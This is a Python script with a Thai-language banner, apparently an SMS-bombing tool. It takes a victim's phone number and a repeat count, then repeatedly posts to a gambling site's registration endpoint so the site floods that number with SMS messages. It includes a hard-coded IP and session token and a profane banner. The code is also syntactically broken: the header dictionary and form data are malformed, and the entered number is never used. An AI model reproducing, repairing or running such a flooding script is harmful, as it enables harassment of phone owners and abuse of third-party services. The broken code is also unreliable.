import requests,time

print("""
      [SMS FREE BY LTEMX2]
          Free Free
	  ฟรีไงไอ้สัส
""")

no = input('ตัวอย่าง : 08xx\n[👉] เบอร์: ')
jml = int(input('[👉] จำนวน: '))

heder = {'Host': 'betflixjoker.com',
'content-length: 102',
'user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36
content-type: application/x-www-form-urlencoded; charset=UTF-8
accept: application/json, text/javascript, */*; q=0.01',
}

data = {"phone=ลบออกใส่เบอร์ที่จะยิง&ip=171.100.183.129&in_time=1633855679&_token=ecMsuiG8N58qgtpiNljCbGhtuPTnMtJqFogi2nu9"}

print("\n[กำลังส่ง]")
for i in range(jml):
      sec = requests.post('https://betflixjoker.com/register/j0795361', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. เบอร์ {no}')
      else:
           print(f'{i+1}. เบอร์ {no}')
      time.sleep(2.0)
      
#เครดิตSCK
